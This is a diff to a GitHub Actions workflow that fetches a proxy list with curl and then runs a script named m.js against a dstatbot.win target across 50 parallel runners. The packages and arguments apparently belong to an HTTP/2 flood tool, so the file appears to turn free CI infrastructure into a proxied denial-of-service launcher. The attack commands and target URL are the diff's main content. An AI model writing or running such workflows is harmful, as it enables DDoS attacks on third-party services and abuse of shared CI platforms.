@@ -13,7 +13,7 @@ jobs:
     strategy:
       max-parallel: 100
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
     
     steps:
       - name: Checkout code
@@ -23,19 +23,16 @@ jobs:
         uses: actions/setup-node@v4
         with:
           node-version: '20'
-          # Remove or comment out the cache line
-          # cache: 'npm'
       
       - name: Install dependencies
         run: npm install net chalk hpack.js hpack colors
       
-      - name: Run m.js
+      - name: Download proxies
         run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > proxy.txt
-             node m.js https://c4.dstatbot.win/9YCTatPq 400 100 10 proxy.txt
+      
+      - name: Run m.js
+        run: node m.js https://c3.dstatbot.win/2csvxKxn 400 100 10 proxy.txt
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
-          TOTAL_INSTANCES: 105
+          TOTAL_INSTANCES: 50  # Match the matrix count
           RUNNER_OS: ubuntu
-
-
-  
